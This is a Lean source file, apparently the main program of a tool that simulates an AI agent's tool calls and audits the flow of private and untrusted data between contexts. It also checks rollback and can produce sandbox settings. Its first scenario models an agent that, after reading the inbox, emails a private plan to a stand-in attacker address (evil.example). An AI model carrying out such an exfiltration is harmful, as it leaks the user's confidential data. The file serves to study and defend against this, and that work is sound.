import FinalSay

open FinalSay

open FinalSay.Demo

def summary (w : World) : List String := [
  s!"  notes:    {w.notes}",
  s!"  drafts:   {w.drafts.length}, sent: {w.sent.map (·.to)}",
  s!"  events:   {w.events}, notified: {w.notified}",
  s!"  balance:  {w.balance}, statement: {w.ledger}"
]

def runSteps (steps : List Step) : Session :=
  Session.run tierMap policy approver (Session.start start) steps

/-- Scenario 1: everything in one context. -/
def oneContext : List Step :=
  let plan : Email := { to := "team@example.com", body := "Q4 plan attached" }
  let exfil : Email := { to := "ceo-office@evil.example", body := "Q4 plan" }
  [.writeNote "Q4 plan", .createEvent "Planning sync", .refund 40, .refund 400,
   .draftEmail plan, .sendEmail plan, .readInbox, .sendEmail exfil,
   .createEvent "Q4 plan review", .writeNote "inbox triaged", .mystery].map (.call "main")

/-- Scenario 2: a quarantined reader context handles the inbox. -/
def splitContext : List Step := [
  .call "main" (.writeNote "Q4 plan"),
  .call "reader" .readInbox,
  -- The reader answers one typed question: is any message a meeting request?
  .handoff "reader" "main" (.structured 1) 1,
  .call "main" (.createEvent "Lunch on Friday"),
  -- Later the reader returns a free-text summary instead.
  .handoff "reader" "main" .freeText 120,
  .call "main" (.createEvent "Q4 plan review"),
  .call "main" (.writeNote "inbox triaged")
]

/-- Scenario 3: code mode. The model writes code; each run is its own context.
Nothing inside a run is traced; only what crosses its edges. -/
def codeMode : List Step := [
  .call "main" (.writeNote "Q4 plan"),
  -- Run 1: the code (free text from main) goes in; it reads the inbox through the gate.
  .handoff "main" "run1" .freeText 240,
  .call "run1" .readInbox,
  -- It saves a file that outlives the run: an edge to whoever later pushes or syncs it.
  .handoff "run1" "workspace" .freeText 512,
  -- It returns a typed result: is any message a meeting request?
  .handoff "run1" "main" (.structured 1) 1,
  .call "main" (.createEvent "Lunch on Friday"),
  -- Run 2: main's code now carries main's labels in; this run prints the messages.
  .handoff "main" "run2" .freeText 180,
  .call "run2" .readInbox,
  .handoff "run2" "main" .freeText 300,
  .call "main" (.createEvent "Q4 plan review"),
  .call "main" (.writeNote "inbox triaged")
]

def exposureLine (s : Session) (ctx : String) : String :=
  let x := s.env ctx
  s!"  {ctx}: private={x.sawPrivate}, untrusted={x.sawUntrusted}{if x.trifecta then "  ← trifecta" else ""}"

def printAuditWith (m : TierMap) (p : Policy) (t : List Event) : IO UInt32 := do
  match audit m p t with
  | [] =>
    IO.println s!"  audit OK: {t.length} events replay, exposure matches the graph, no unapproved channel use"
    return 0
  | fs =>
    for f in fs do IO.println s!"  FINDING {f}"
    return 1

def printAudit (t : List Event) : IO UInt32 := printAuditWith tierMap policy t

def runScenarios : IO Unit := do
  let s := runSteps oneContext
  IO.println "══ Scenario 1: one context ══"
  for l in s.log do IO.println l
  IO.println "\n── World after the session ──"
  for l in summary s.world do IO.println l
  let r := s.rollback
  IO.println "\n── After rollback ──"
  for l in summary r.world do IO.println l
  IO.println "\n  notes: restored exactly (reversible)"
  IO.println "  balance: restored, but the statement keeps both entries (compensatable)"
  IO.println "  calendar: event gone, but the invite and cancellation were both seen (compensatable)"
  IO.println "  sent email: still sent (irreversible)"
  IO.println "\n── Channel report ──"
  for l in channelReport s.trace do IO.println s!"  {l}"
  let _ ← printAudit s.trace

  let s := runSteps splitContext
  IO.println "\n══ Scenario 2: a quarantined reader ══"
  for l in s.log do IO.println l
  IO.println "\n── Exposure by context (computed from the trace) ──"
  IO.println (exposureLine s "main")
  IO.println (exposureLine s "reader")
  IO.println "\n── Channel report ──"
  for l in channelReport s.trace do IO.println s!"  {l}"
  let _ ← printAudit s.trace

  let s := runSteps codeMode
  IO.println "\n══ Scenario 3: code mode ══"
  for l in s.log do IO.println l
  IO.println "\n── Exposure by context (computed from the trace) ──"
  for c in ["main", "run1", "run2", "workspace"] do IO.println (exposureLine s c)
  IO.println "  (workspace: anything that later pushes or syncs these files is a channel)"
  IO.println "\n── Channel report ──"
  for l in channelReport s.trace do IO.println s!"  {l}"
  let _ ← printAudit s.trace

def readTrace (path : String) : IO (Except String (List Event)) := do
  let lines := (← IO.FS.readFile path).splitOn "\n" |>.filter (· ≠ "")
  let step (st : List Event × Nat) (l : String) : Except String (List Event × Nat) :=
    match (Lean.Json.parse l >>= Lean.fromJson? : Except String Event) with
    | Except.ok e => Except.ok (st.1 ++ [e], st.2 + 1)
    | Except.error err => Except.error s!"line {st.2}: {err}"
  return (lines.foldlM step ([], 1)).map (·.1)

def auditWith (path : String) (m : TierMap) (p : Policy) : IO UInt32 := do
  match ← readTrace path with
  | .error err =>
    -- Fail closed: a trace that can't be read doesn't pass.
    IO.println s!"  FINDING unreadable trace, {err}"
    return 1
  | .ok t =>
    for l in channelReport t do IO.println s!"  {l}"
    printAuditWith m p t

def scenario : String → Option (List Step)
  | "one" => some oneContext
  | "split" => some splitContext
  | "code" => some codeMode
  | _ => none

def usage : IO UInt32 := do
  IO.eprintln "usage: finalsay                        run both toy scenarios"
  IO.eprintln "       finalsay export F               write conformance fixtures to F"
  IO.eprintln "       finalsay srt-config [F]         write the outer sandbox (srt) settings, generated from the policy"
  IO.eprintln "       finalsay trace one|split|code F      write a scenario's trace to F (JSON lines)"
  IO.eprintln "       finalsay audit F [--config C]   audit a trace (demo config, or C)"
  IO.eprintln "       finalsay graph one|split|code        print a scenario's flow graph (Mermaid)"
  return 1

def main (args : List String) : IO UInt32 := do
  match args with
  | [] => runScenarios; return 0
  | ["srt-config"] =>
    IO.println (FinalSay.Srt.generate FinalSay.Srt.defaultOuter).toJson.pretty
    return 0
  | ["srt-config", path] =>
    IO.FS.writeFile path ((FinalSay.Srt.generate FinalSay.Srt.defaultOuter).toJson.pretty ++ "\n")
    IO.println s!"wrote {path}"
    return 0
  | ["export", path] =>
    IO.FS.writeFile path (FinalSay.Fixtures.all.pretty ++ "\n")
    IO.println s!"wrote {path}"
    return 0
  | ["trace", name, path] =>
    let some steps := scenario name | usage
    let t := (runSteps steps).trace
    IO.FS.writeFile path (String.join (t.map fun e => (Lean.toJson e).compress ++ "\n"))
    IO.println s!"wrote {t.length} events to {path}"
    return 0
  | ["audit", path] => auditWith path tierMap policy
  | ["audit", path, "--config", cfgPath] =>
    let cfg := (Lean.Json.parse (← IO.FS.readFile cfgPath)) >>= FinalSay.Config.parse
    match cfg with
    | .error err =>
      IO.println s!"  FINDING unreadable config, {err}"
      return 1
    | .ok c => auditWith path c.tierMap c.policy
  | ["graph", name] =>
    let some steps := scenario name | usage
    IO.println (toMermaid (runSteps steps).trace)
    return 0
  | _ => usage
